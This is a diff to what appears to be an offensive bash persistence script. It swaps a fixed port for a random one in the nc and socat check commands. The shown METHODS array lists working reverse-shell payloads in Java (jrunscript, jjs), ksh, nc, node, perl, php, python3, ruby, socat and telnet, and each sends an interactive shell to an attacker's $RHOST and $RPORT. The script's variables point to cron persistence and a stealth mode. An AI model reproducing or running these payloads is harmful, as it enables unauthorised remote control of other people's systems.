@@ -16,6 +16,7 @@ PAYLOADFILE=$(mktemp)
 PERMACRON=$(mktemp)
 PIPTMPDIR=$(mktemp -d)
 PIP3TMPDIR=$(mktemp -d)
+RANDOMPORT=$(expr 1024 + $RANDOM)
 SHELL="/bin/bash"
 STEALTHMODE=0
 TMPCLEANBASHRC=$(mktemp)
@@ -142,7 +143,7 @@ METHODS=(
 	"jrunscript , jrunscript -e 'exit();' , jrunscript -e 'var host=\\\"$RHOST\\\"; var port=$RPORT;var p=new java.lang.ProcessBuilder(\\\"$SHELL\\\", \\\"-i\\\").redirectErrorStream(true).start();var s=new java.net.Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'?"
 	"jjs , echo \"quit()\" > $JJSFILE; jjs $JJSFILE , echo 'var ProcessBuilder = Java.type(\\\"java.lang.ProcessBuilder\\\");var p=new ProcessBuilder(\\\"$SHELL\\\", \\\"-i\\\").redirectErrorStream(true).start();var Socket = Java.type(\\\"java.net.Socket\\\");var s=new Socket(\\\"$RHOST\\\",$RPORT);var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\\\"java.lang.Thread\\\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs?" 
 	"ksh , ksh -c 'exit' , ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'?"
-	"nc , nc -w 1 -lnvp 5253 &> /dev/null & nc 0.0.0.0 5253 &> /dev/null , nc $RHOST $RPORT -e $SHELL?"
+	"nc , nc -w 1 -lnvp $RANDOMPORT &> /dev/null & nc 0.0.0.0 $RANDOMPORT &> /dev/null , nc $RHOST $RPORT -e $SHELL?"
 	"node , node -e \"process.exit(0)\" , node -e \\\"sh = require(\\\\\\\"child_process\\\\\\\").spawn(\\\\\\\"$SHELL\\\\\\\");net.connect($RPORT, \\\\\\\"$RHOST\\\\\\\", function () {this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this);});\\\"?"
 	"perl , perl -e \"use Socket;\" , perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($RPORT,inet_aton(\\\"$RHOST\\\")))){open(STDIN,\\\"\>\&S\\\");open(STDOUT,\\\"\>\&S\\\");open(STDERR,\\\"\>\&S\\\");exec(\\\"$SHELL -i\\\");};'?"
 	"php , php -r 'exit();' , php -r \\\"exec(\\\\\\\"$SHELL -c '$SHELL -i >& /dev/tcp/$RHOST/$RPORT 0>&1'\\\\\\\");\\\"?"
@@ -156,7 +157,7 @@ METHODS=(
 	"python3 , python3 -c 'import socket,subprocess,os;exit()' , python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);'?"
 	"python3.8 , python3.8 -c 'import socket,subprocess,os;exit()' , python3.8 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);'?"
 	"ruby , ruby -rsocket -e 'exit' , ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\\\"'$RHOST'\\\",'$RPORT');while(cmd=c.gets);IO.popen(cmd,\\\"r\\\"){|io|c.print io.read}end'?"
-	"socat , socat tcp-listen:5253 STDOUT & echo exit | socat -t 1 STDIN tcp-connect:0.0.0.0:5253 , socat tcp-connect:$RHOST:$RPORT exec:$SHELL,pty,stderr,setsid,sigint,sane?"
+	"socat , socat tcp-listen:$RANDOMPORT STDOUT & echo exit | socat -t 1 STDIN tcp-connect:0.0.0.0:$RANDOMPORT , socat tcp-connect:$RHOST:$RPORT exec:$SHELL,pty,stderr,setsid,sigint,sane?"
 	"telnet , echo quit | telnet , TELNETNAMEDPIPE=\\\$(mktemp -u);mkfifo \\\$TELNETNAMEDPIPE && telnet $RHOST $RPORT 2> /dev/null 0<\\\$TELNETNAMEDPIPE | $SHELL 1>\\\$TELNETNAMEDPIPE 2> /dev/null & sleep .0001 #?"
 )
 
